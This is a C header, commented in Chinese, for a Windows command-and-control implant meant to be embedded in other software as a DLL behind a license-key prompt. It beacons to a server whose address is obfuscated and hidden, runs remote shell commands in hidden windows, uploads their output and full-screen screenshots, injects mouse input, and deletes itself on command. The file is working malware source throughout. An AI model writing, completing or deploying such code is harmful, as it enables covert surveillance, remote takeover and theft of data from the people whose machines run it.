/*
 * c2.h — Win C2 核心：注册、心跳、命令执行、上传
 */
#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <gdiplus.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "config.h"
#include "vault.h"
#include "http.h"
#include "json.h"
#include "device_id.h"

/* ---- 全局状态 ---- */
static volatile LONG  g_running    = 0;
static volatile int   g_poll_sec   = DEFAULT_POLL_SEC;
static volatile int   g_c2_enabled = 1;
static volatile int   g_expire_block = 0; /* 1=卡密过期阻断，直接拒绝执行 */
static HANDLE         g_wake_event = NULL; /* 用于提前唤醒 sleep */
static char           g_device_id[128] = {0};
static char           g_software_type[64] = {0};
static char           g_software_version[32] = "1.0.0";
static char           g_kami[256] = {0};

/* ---- Base64 编码（用于上传） ---- */
static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static char* base64_encode(const unsigned char* in, size_t len) {
    size_t out_len = ((len + 2) / 3) * 4 + 1;
    char* out = (char*)malloc(out_len);
    if (!out) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < len; ) {
        unsigned int o0 = i < len ? in[i++] : 0;
        unsigned int o1 = i < len ? in[i++] : 0;
        unsigned int o2 = i < len ? in[i++] : 0;
        unsigned int tri = (o0 << 16) | (o1 << 8) | o2;
        out[j++] = B64[(tri >> 18) & 0x3F];
        out[j++] = B64[(tri >> 12) & 0x3F];
        out[j++] = (i > len + 1) ? '=' : B64[(tri >> 6) & 0x3F];
        out[j++] = (i > len)     ? '=' : B64[tri & 0x3F];
    }
    out[j] = '\0';
    return out;
}

/* ---- 上传字节（base64 form） ---- */
static void c2_upload_bytes(const char* cmd_id, const char* type, const char* ext,
                             const unsigned char* data, size_t data_len) {
    VAULT_STR(upload_url, BLOB_EP_UPLOAD);
    VAULT_STR(base_url,   BLOB_BASE_URL);
    char url[512];
    snprintf(url, sizeof(url), "%s%s", base_url, upload_url);
    free(base_url);
    free(upload_url);

    char* b64 = base64_encode(data, data_len);
    if (!b64) return;

    kv_t fields[] = {
        {"device_id", g_device_id},
        {"cmd_id",    cmd_id},
        {"type",      type},
        {"ext",       ext},
        {"data",      b64}
    };
    char* resp = http_post_form(url, fields, 5);
    free(b64);
    if (resp) free(resp);
}

static void c2_upload_text(const char* cmd_id, const char* type, const char* text) {
    c2_upload_bytes(cmd_id, type, "txt", (const unsigned char*)text, strlen(text));
}

/* ---- 截图（GDI）---- */
static void cmd_screenshot(const char* cmd_id) {
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hDC, hBmp);
    BitBlt(hDC, 0, 0, w, h, hScreen, x, y, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    /* 转 BMP 字节 */
    BITMAPINFOHEADER bih = {0};
    bih.biSize = sizeof(bih);
    bih.biWidth = w; bih.biHeight = -h;
    bih.biPlanes = 1; bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    DWORD rowBytes = ((w * 3 + 3) & ~3);
    DWORD imgSize = rowBytes * h;

    BITMAPFILEHEADER bfh = {0};
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bih);
    bfh.bfSize = bfh.bfOffBits + imgSize;

    unsigned char* pixels = (unsigned char*)malloc(imgSize);
    if (pixels) {
        GetDIBits(hDC, hBmp, 0, h, pixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
        size_t total = sizeof(bfh) + sizeof(bih) + imgSize;
        unsigned char* bmp = (unsigned char*)malloc(total);
        if (bmp) {
            memcpy(bmp, &bfh, sizeof(bfh));
            memcpy(bmp + sizeof(bfh), &bih, sizeof(bih));
            memcpy(bmp + sizeof(bfh) + sizeof(bih), pixels, imgSize);
            c2_upload_bytes(cmd_id, "screenshot", "bmp", bmp, total);
            free(bmp);
        }
        free(pixels);
    } else {
        c2_upload_text(cmd_id, "screenshot", "screenshot failed: out of memory");
    }

    DeleteObject(hBmp);
    DeleteDC(hDC);
}

/* ---- Shell 执行 ---- */
static void cmd_shell(const char* cmd_id, const char* cmd) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        c2_upload_text(cmd_id, "shell", "CreatePipe failed");
        return;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdline[2048];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        c2_upload_text(cmd_id, "shell", "CreateProcess failed");
        return;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    char buf[65536] = {0};
    DWORD read, total = 0;
    while (ReadFile(hRead, buf + total, sizeof(buf) - total - 1, &read, NULL) && read > 0) {
        total += read;
        if (total >= sizeof(buf) - 1) break;
    }
    buf[total] = '\0';
    CloseHandle(hRead);
    c2_upload_text(cmd_id, "shell", total > 0 ? buf : "(no output)");
}

/* ---- 模拟点击 ---- */
static void cmd_tap(const char* cmd_id, int x, int y) {
    SetCursorPos(x, y);
    INPUT inp[2] = {0};
    inp[0].type = INPUT_MOUSE; inp[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
    inp[1].type = INPUT_MOUSE; inp[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
    SendInput(2, inp, sizeof(INPUT));
    char msg[64];
    snprintf(msg, sizeof(msg), "tap x=%d y=%d ok=1", x, y);
    c2_upload_text(cmd_id, "input_tap", msg);
}

/* ---- 模拟滑动 ---- */
static void cmd_swipe(const char* cmd_id, int x1, int y1, int x2, int y2, int dur_ms) {
    int steps = dur_ms / 16;
    if (steps < 2) steps = 2;
    SetCursorPos(x1, y1);
    INPUT inp = {0};
    inp.type = INPUT_MOUSE;
    inp.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
    SendInput(1, &inp, sizeof(INPUT));
    for (int i = 1; i <= steps; i++) {
        int cx = x1 + (x2 - x1) * i / steps;
        int cy = y1 + (y2 - y1) * i / steps;
        SetCursorPos(cx, cy);
        Sleep(dur_ms / steps);
    }
    inp.mi.dwFlags = MOUSEEVENTF_LEFTUP;
    SendInput(1, &inp, sizeof(INPUT));
    char msg[96];
    snprintf(msg, sizeof(msg), "swipe x1=%d y1=%d x2=%d y2=%d dur=%d ok=1", x1, y1, x2, y2, dur_ms);
    c2_upload_text(cmd_id, "input_swipe", msg);
}

/* ---- 消息提示 ---- */
static void cmd_message(const char* cmd_id, const char* text) {
    /* 托盘气泡（Shell_NotifyIcon），降级到 MessageBox */
    MessageBoxA(NULL, text, "消息", MB_OK | MB_ICONINFORMATION | MB_TOPMOST | MB_SYSTEMMODAL);
    c2_upload_text(cmd_id, "message", "shown");
}

/* ---- 自毁（删除自身 EXE） ---- */
static void cmd_self_destruct(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, sizeof(path));
    /* bat 延迟删除 */
    char bat[MAX_PATH];
    GetTempPathA(sizeof(bat), bat);
    strcat(bat, "c2del.bat");
    FILE* f = fopen(bat, "w");
    if (f) {
        fprintf(f, "@echo off\n:loop\ndel /f /q \"%s\" 2>nul\nif exist \"%s\" goto loop\ndel /f /q \"%%~f0\"\n", path, path);
        fclose(f);
        STARTUPINFOA si = {sizeof(si)};
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW;
        PROCESS_INFORMATION pi = {0};
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", bat);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread) CloseHandle(pi.hThread);
    }
    InterlockedExchange(&g_running, 0);
    SetEvent(g_wake_event);
}

/* ---- ACK ---- */
static void c2_ack(const char* ids[], int n) {
    if (n == 0) return;
    VAULT_STR(base_url, BLOB_BASE_URL);
    VAULT_STR(ack_ep,   BLOB_EP_ACK);
    char url[512];
    snprintf(url, sizeof(url), "%s%s", base_url, ack_ep);
    free(base_url); free(ack_ep);

    /* 拼接 id1,id2,... */
    char id_list[2048] = {0};
    for (int i = 0; i < n; i++) {
        if (i > 0) strcat(id_list, ",");
        strncat(id_list, ids[i], sizeof(id_list) - strlen(id_list) - 1);
    }
    kv_t fields[] = {
        {"device_id",    g_device_id},
        {"software_type", g_software_type},
        {"command_ids",  id_list},
        {"result",       "ok"}
    };
    char* resp = http_post_form(url, fields, 4);
    if (resp) free(resp);
}

/* ---- 处理心跳/注册响应 ---- */
static void c2_handle(const char* resp) {
    if (!resp) return;

    /* 解析 config */
    const char* data = strstr(resp, "\"data\"");
    if (!data) return;

    /* poll_interval */
    int poll = json_int(data, "poll_interval", 0);
    if (poll >= MIN_POLL_SEC) g_poll_sec = poll;

    /* enable_c2 */
    g_c2_enabled = json_bool(data, "enable_c2", 1);

    /* 解析 pending_commands 数组 */
    const char* cmds_start = strstr(data, "\"pending_commands\"");
    if (!cmds_start) return;
    const char* arr = strchr(cmds_start, '[');
    if (!arr) return;

    const char* ctx = NULL;
    const char* obj_end = NULL;
    const char* obj;
    const char* done_ids[64];
    int done_n = 0;

    while ((obj = json_array_next(arr, &ctx, &obj_end)) != NULL && done_n < 64) {
        /* 截取对象字符串 */
        size_t obj_len = obj_end - obj;
        char* o = (char*)malloc(obj_len + 1);
        if (!o) continue;
        memcpy(o, obj, obj_len);
        o[obj_len] = '\0';

        char id[64] = {0};
        char type[64] = {0};
        json_str(o, "id",   id,   sizeof(id));
        json_str(o, "type", type, sizeof(type));

        if (!id[0]) { free(o); continue; }

        /* wake：唤醒心跳线程，立刻做下次心跳 */
        if (strcmp(type, "wake") == 0) {
            SetEvent(g_wake_event);
        }
        /* expire_block：卡密过期阻断 */
        else if (strcmp(type, "expire_block") == 0) {
            g_expire_block = 1;
            MessageBoxA(NULL, "您的授权已过期，功能已被限制。", "授权过期", MB_OK | MB_ICONWARNING | MB_TOPMOST);
        }
        /* 正常命令 */
        else if (g_c2_enabled && !g_expire_block) {
            const char* payload = strstr(o, "\"payload\"");

            if (strcmp(type, "screenshot") == 0) {
                cmd_screenshot(id);
            } else if (strcmp(type, "shell") == 0) {
                char cmd[1024] = {0};
                if (payload) { json_str(payload, "cmd", cmd, sizeof(cmd)); if (!cmd[0]) json_str(payload, "text", cmd, sizeof(cmd)); }
                if (cmd[0]) cmd_shell(id, cmd);
            } else if (strcmp(type, "input_tap") == 0) {
                int x = 0, y = 0;
                if (payload) { x = json_int(payload, "x", 0); y = json_int(payload, "y", 0); }
                cmd_tap(id, x, y);
            } else if (strcmp(type, "input_swipe") == 0) {
                int x1=0, y1=0, x2=0, y2=0, dur=300;
                if (payload) {
                    x1 = json_int(payload, "x1", 0); y1 = json_int(payload, "y1", 0);
                    x2 = json_int(payload, "x2", 0); y2 = json_int(payload, "y2", 0);
                    dur = json_int(payload, "duration", 300);
                }
                cmd_swipe(id, x1, y1, x2, y2, dur);
            } else if (strcmp(type, "message") == 0) {
                char text[512] = {0};
                if (payload) json_str(payload, "text", text, sizeof(text));
                cmd_message(id, text);
            } else if (strcmp(type, "kick") == 0) {
                /* 不做卸载，直接退出 */
                InterlockedExchange(&g_running, 0);
                SetEvent(g_wake_event);
            } else if (strcmp(type, "self_destruct") == 0) {
                /* ACK 先加进去，等会儿一起发完再自毁 */
                char* id_copy = _strdup(id);
                done_ids[done_n++] = id_copy;
                free(o);
                c2_ack(done_ids, done_n);
                for (int k = 0; k < done_n; k++) free((void*)done_ids[k]);
                cmd_self_destruct();
                return;
            }
        }

        char* id_copy = _strdup(id);
        done_ids[done_n++] = id_copy;
        free(o);
    }

    if (done_n > 0) {
        c2_ack(done_ids, done_n);
        for (int i = 0; i < done_n; i++) free((void*)done_ids[i]);
    }
}

/* ---- POST 一次心跳/注册 ---- */
static void c2_beat(const char* endpoint) {
    VAULT_STR(base_url, BLOB_BASE_URL);
    char url[512];
    snprintf(url, sizeof(url), "%s%s", base_url, endpoint);
    free(base_url);

    char hostname[128] = {0};
    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
    OSVERSIONINFOA ov = {sizeof(ov)};
    GetVersionExA(&ov);
    char os_ver[32];
    snprintf(os_ver, sizeof(os_ver), "Windows %lu.%lu", ov.dwMajorVersion, ov.dwMinorVersion);

    kv_t fields[] = {
        {"device_id",        g_device_id},
        {"software_type",    g_software_type},
        {"software_version", g_software_version},
        {"os",               "windows"},
        {"name",             hostname},
        {"model",            hostname},
        {"os_version",       os_ver},
        {"card",             g_kami}
    };
    char* resp = http_post_form(url, fields, 8);
    c2_handle(resp);
    if (resp) free(resp);
}

/* ---- C2 主循环线程 ---- */
static DWORD WINAPI c2_thread(LPVOID _) {
    /* 注册 */
    VAULT_STR(reg_ep, BLOB_EP_REG);
    c2_beat(reg_ep);
    free(reg_ep);

    VAULT_STR(beat_ep, BLOB_EP_BEAT);
    while (InterlockedCompareExchange(&g_running, 1, 1) == 1) {
        int sec = g_poll_sec < MIN_POLL_SEC ? MIN_POLL_SEC : g_poll_sec;
        WaitForSingleObject(g_wake_event, sec * 1000);
        ResetEvent(g_wake_event);
        if (InterlockedCompareExchange(&g_running, 1, 1) != 1) break;
        c2_beat(beat_ep);
    }
    free(beat_ep);
    return 0;
}

/* ================================================================
 * 公开 API（DLL 导出 + EXE 调用）
 * ================================================================ */

/*
 * C2_Start — 启动 C2 后台线程
 *   server_url    : NULL = 使用 blobs.h 中编译时地址
 *   software_type : 分组标识，如 "win_agent"、"momo_pc"
 *   kami          : 卡密（NULL = 跳过卡密，依赖服务端 auto_issue_card）
 *   version       : 软件版本字符串，NULL = "1.0.0"
 * 返回 1 成功，0 失败（已在运行）
 */
__declspec(dllexport) int C2_Start(const char* software_type, const char* kami, const char* version) {
    if (InterlockedExchange(&g_running, 1) == 1) return 0; /* 已在运行 */

    get_device_id(g_device_id, sizeof(g_device_id));
    strncpy(g_software_type, software_type ? software_type : SOFTWARE_TYPE, sizeof(g_software_type) - 1);
    if (version) strncpy(g_software_version, version, sizeof(g_software_version) - 1);

    /* 卡密处理 */
    if (kami && *kami) {
        strncpy(g_kami, kami, sizeof(g_kami) - 1);
        kami_save(g_kami);
    } else if (!kami_load(g_kami, sizeof(g_kami))) {
        /* 没有缓存卡密 —— 弹框让用户输入（若服务端开了 auto_issue 则会忽略） */
        kami_prompt(g_kami, sizeof(g_kami), "授权验证", "请输入卡密");
        if (g_kami[0]) kami_save(g_kami);
    }

    g_wake_event = CreateEventA(NULL, FALSE, FALSE, NULL);
    HANDLE h = CreateThread(NULL, 0, c2_thread, NULL, 0, NULL);
    if (h) CloseHandle(h);
    return 1;
}

/* C2_Stop — 停止 C2（等待线程退出，最多 3 秒） */
__declspec(dllexport) void C2_Stop(void) {
    InterlockedExchange(&g_running, 0);
    if (g_wake_event) SetEvent(g_wake_event);
    Sleep(500);
}

/* C2_SetKami — 运行时更新卡密 */
__declspec(dllexport) void C2_SetKami(const char* kami) {
    if (!kami) return;
    strncpy(g_kami, kami, sizeof(g_kami) - 1);
    kami_save(g_kami);
}
